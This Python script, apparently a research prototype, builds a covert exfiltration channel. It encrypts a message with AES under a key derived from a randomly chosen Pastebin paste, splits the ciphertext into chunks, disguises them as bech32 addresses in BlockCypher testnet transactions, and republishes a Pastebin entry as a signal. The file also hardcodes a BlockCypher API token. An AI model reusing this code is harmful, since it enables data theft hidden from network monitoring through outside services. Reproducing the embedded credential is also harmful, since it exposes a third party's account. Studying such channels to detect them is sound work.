# -*- coding: utf-8 -*-
"""
Created on Thu May  6 11:48:07 2021

"""

import blockcypher as bcy
import json
import requests
from random import randrange
from Crypto.Cipher import AES
import utils
import bech32
import logging
from Crypto.Random import get_random_bytes
from bitcoin import compress


LOGGER = logging.getLogger(__name__)
LOGGER.propagate = False
LOGGER.setLevel(logging.DEBUG)
if not LOGGER.handlers:    
    LOGGER.addHandler(logging.StreamHandler())

#logging.basicConfig(level=logging.INFO)

KEY_DIR = "info/input/"

BCY_API_TOKEN = "5e166bc28a2a4deaaba242594540b344"

INPUT_ADDR = "C1ZDga3zv2xbq7zdiQSLN9GWbDDSGxjbuv"
ADDR_LEN = 20

NAME_WALLET_INPUT = "Mario"

private_key = None
public_key = None
addr = None
wif = None


######
#
# @func: Store the information of the newly created address
#
# @desc: This function wouldn´t exist on a "production" version of the tool it
#        it is used to generate and save the hardcoded address used at start 
#        and end of communications
#
######
def store_info():
    
    r = requests.post("https://api.blockcypher.com/v1/bcy/test/addrs")
    
    global INPUT_ADDR
    
    keys = json.loads(r.text)
    
    with open(KEY_DIR + "priv.txt","x") as file:
        file.write(keys["private"])
        
    with open(KEY_DIR + "pub.txt","x") as file:
        file.write(keys["public"])
        
    INPUT_ADDR = keys["address"]
    with open(KEY_DIR + "addr.txt","x") as file:
        file.write(keys["address"])
        
    with open(KEY_DIR + "wif.txt","x") as file:
        file.write(keys["wif"])
        

######
#
# @func: Read the information from a previously created address
#
# @desc: This function wouldn´t exist on a "production" version of the tool it
#        used to read the value of the hardcoded address previously saved
#
######
def read_info():
    
    global private_key, public_key, addr, wif, INPUT_ADDR
    
    with open(KEY_DIR + "priv.txt","r") as file:
        private_key = file.read()
        
    with open(KEY_DIR + "pub.txt","r") as file:
        public_key = file.read()
        
    with open(KEY_DIR + "addr.txt","r") as file:
        addr = file.read()
        INPUT_ADDR = addr
        
    with open(KEY_DIR + "wif.txt","r") as file:
        wif = file.read()


######
#
# @func: Create the wallet necesary for using a different address per transaction
#        guaranteeing at the same time ordering when receiving
#
#
######

def create_wallets():
    
    bcy.create_wallet_from_address(wallet_name=NAME_WALLET_INPUT, address=INPUT_ADDR,api_key = BCY_API_TOKEN, coin_symbol="bcy")
    
    
######
#
# @func: Calls to the blockcypher SDK for creating and broadcasting a transaction
#
# @param: Notify whether or not this is the first/last transaction or not. Which
#         basically implies if the hardcoded address must be used or not
#
# @param: Cyphered and encoded chunk of information used as the output address
#         of the transaction
#
######
input_addr = ""
def send_tx(first,output_addr):
    
    global input_addr

    if not first:
        r = requests.post("https://api.blockcypher.com/v1/bcy/test/addrs")
        input_info = json.loads(r.text)
        input_addr = input_info["address"]
        privkey_list = [input_info["private"]]
        pubkey_list = [input_info["public"]]

        bcy.add_address_to_wallet(wallet_name=NAME_WALLET_INPUT, address=input_addr, api_key=BCY_API_TOKEN,coin_symbol="bcy")
        bcy.send_faucet_coins(address_to_fund=input_addr, satoshis=randrange(70000,80000), api_key=BCY_API_TOKEN, coin_symbol='bcy')

    else:
        input_addr = addr
        privkey_list = [private_key]
        pubkey_list = [public_key]


    LOGGER.info("INPUT ADDRESS: " + input_addr)
    
    inputs = [{'address': input_addr}]
    outputs = [{'address': output_addr, 'value': randrange(1000,10000)}]
    unsigned_tx = bcy.create_unsigned_tx(inputs=inputs, outputs=outputs, coin_symbol='bcy',api_key=BCY_API_TOKEN)
    tx_signatures = bcy.make_tx_signatures(txs_to_sign=unsigned_tx['tosign'], privkey_list=privkey_list, pubkey_list=pubkey_list)
   
    try:
        result = bcy.broadcast_signed_transaction(unsigned_tx=unsigned_tx, signatures=tx_signatures, pubkeys=pubkey_list,api_key=BCY_API_TOKEN, coin_symbol='bcy')
    except:
        bcy.send_faucet_coins(address_to_fund=input_addr, satoshis=1000000, api_key=BCY_API_TOKEN, coin_symbol='bcy')
        result = bcy.broadcast_signed_transaction(unsigned_tx=unsigned_tx, signatures=tx_signatures, pubkeys=pubkey_list,api_key=BCY_API_TOKEN, coin_symbol='bcy')

    
    if "errors" in result:
        LOGGER.critical("Could not send transaction to the blockchain")
        for error in result["errors"]:
            LOGGER.critical(error["error"])
        return -1
          
    return 0


#######
#
# @func: In order to satisfy both the AES block size and the bech32 input length
#        some tailored padding function is needed. This functions just iterates
#        to find this perfect padding
#
# @param: Base length to which find the padding
#
######  

def perfect_padding(length):
    
    x = 0
    while (length+x)%ADDR_LEN != 0 or (length+x)%AES.block_size != 0:
        x = x+1
        #LOGGER.debug(("{0}/{1} = {2}").format((length+x),ADDR_LEN,(length+x)/ADDR_LEN))
        #LOGGER.debug(("{0}/{1} = {2}").format((length+x),AES.block_size,(length+x)/AES.block_size))
        #time.sleep(1)
        
    return "#"*x


#######
#
# @func: Exfiltrate the information the the BCY testnet
#
# @param: Message to exfiltrate
#
######   

result = None
unsigned_tx = None

def exfiltrate_information(msg):

    global result,unsigned_tx
    
    pad = perfect_padding(len(msg.encode()))
    padded_msg = msg + pad
    
    passphrase = utils.pastebin_entries[randrange(len(utils.pastebin_entries))]
    LOGGER.debug("Pastebin data: " + passphrase)
    addr, title, syntax = passphrase.split(",")
    r = requests.get(utils.PASTEBIN_RAW + addr)
    if r.status_code == 200:
        utils.obtain_user_key()
        if utils.publish_pastebin(r.text,title,syntax) < 0: return
        passwd = utils.generate_password(r.text.encode(encoding="ascii",errors="replace"))
        key = passwd[:32]
        iv = passwd[32:48]
    else:
        LOGGER.critical("Error retrieving the passphrase content from pastebin")
        return
    
    cipher = AES.new(key, AES.MODE_CBC,iv)
    cmsg = cipher.encrypt(padded_msg.encode())
         
    LOGGER.debug(cmsg)
    LOGGER.debug(key)
    LOGGER.debug(iv)
    
    LOGGER.debug(cmsg)
    
    chunks = round(len(cmsg)/ADDR_LEN)
    i = 0
    while i < len(cmsg): 
        
        chunk = cmsg[i:i+ADDR_LEN]
        LOGGER.debug(chunk)
        
        encoded_chunk = bech32.encode(hrp="bcy",witver=0,witprog=chunk)
        
        if i == 0: 
            if send_tx(1,encoded_chunk) < 0: return
        else:
            if send_tx(0,encoded_chunk) < 0: return
            
        i += ADDR_LEN
        
    random = get_random_bytes(20)
    encoded_random = bech32.encode(hrp="bcy",witver=0,witprog=random)
    if send_tx(1,encoded_random) < 0: return

        
    
#store_info()
read_info()
create_wallets()
utils.gather_pb_entries()


# INPUT HERE THE MESSAGE YOU WANT TO TRANSMIT
msg="José María de Fuentes García Romero de Tejada"
exfiltrate_information(msg)